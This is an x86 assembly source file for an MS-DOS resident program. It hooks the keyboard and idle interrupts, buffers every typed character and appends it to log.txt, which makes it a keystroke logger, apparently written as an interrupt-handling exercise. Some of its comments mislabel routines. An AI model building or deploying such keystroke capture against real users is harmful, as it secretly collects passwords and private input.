.186
.model tiny

.code
org 100h
locals @@

Start:
		cli

		mov bx, 9h*4h		;9*4 -- address of 9'th interruption
		call ChangeInterruption

		mov bx, 28h*4h
		call ChangeInterruption

		sti

		jmp StayResident




StayResident:
		mov ax, 3100h
		mov dx, 400h		;program size; must be enough
		int 21h


;====================================================================================== 
;Entry: BX - address of interruption to change, ES - fragment number	
;Destr: BX, AX, DX
;======================================================================================
ChangeInterruption proc
        xor ax, ax
        mov es, ax

		cmp bx, 28h*4h
		je @@28

		mov ax, word ptr es:[bx]
		mov word ptr Old09, ax

		inc bx
		inc bx
		mov ax, word ptr es:[bx]
		mov word ptr Old09+2, ax

		mov ah, 25h
		mov al, 09h	
		mov dx, offset New09h
		jmp @@end_proc
@@28:
		mov ax, word ptr es:[bx]
		mov word ptr Old28, ax

		inc bx
		inc bx
		mov ax, word ptr es:[bx]
		mov word ptr Old28+2, ax

		mov ah, 25h
		mov al, 28h	
		mov dx, offset New28h
@@end_proc:
		int 21h
		ret
        endp



;======================================================================================
;Writes scancode to buf
;======================================================================================
New28h	proc
		pusha

		call flush_buff 

		popa

		pushf
		call dword ptr cs:[Old28]

@@end_proc:
		iret
		endp
Old28: 		dw 0
			dw 0
;======================================================================================
;Writes scancode to buf
;======================================================================================
New09h 	proc

		pusha

		pushf
		call dword ptr cs:[Old09]

		call to_buf

		popa

		iret
		endp
Old09: 		dw 0
			dw 0

;======================================================================================
;Writes a symbol to buf using 16'th interrupt to get ascii code from scancode
;======================================================================================
to_buf	proc 
		push ds cs
		pop ds

		mov ah, 01h
		int 16h

		jz @@exit

		mov bl, buff_end 
		xor bh, bh

		mov buff[bx], al
		inc buff_end
@@exit:
		pop ds
		ret
		endp

;======================================================================================
;Writes data from buf to file
;======================================================================================
flush_buff proc 

		push ds cs
		pop ds
		
		mov cl, cs:buff_end
		xor ch, ch
	
		push cx

	;opening file by adress in ds:dx and saving its handler  
		mov ax, 3d01h; 
		mov dx, offset log_file;
		int 21h
		mov file_handler, ax


	;moving cursor to the end of file
		mov ax, 4202h
		mov bx, file_handler
		xor cx, cx
		xor dx, dx
		int 21h

;!!! 
		mov al, buff_start
		xor ah, ah
		mov dx, offset buff
		add dx, ax

		pop cx
	;writing to file
		mov ah, 40h
		mov bx, file_handler
		sub cl, buff_start
		xor ch, ch
;		mov dx, offset buff
;		add dx, head_ind
		int 21h
		
		add cl, buff_start
		xor ch, ch
		mov buff_start, cl

	;closing file
		mov ah, 3eh
		mov bx, file_handler
		int 21h

@@exit:
		pop ds
		ret
		endp


log_file     	db 'log.txt', 0
file_handler    dw 0

buff 		    db 256d dup (0h)
buff_start      db 0
buff_end	    db 0

Exit:
		ret
		end Start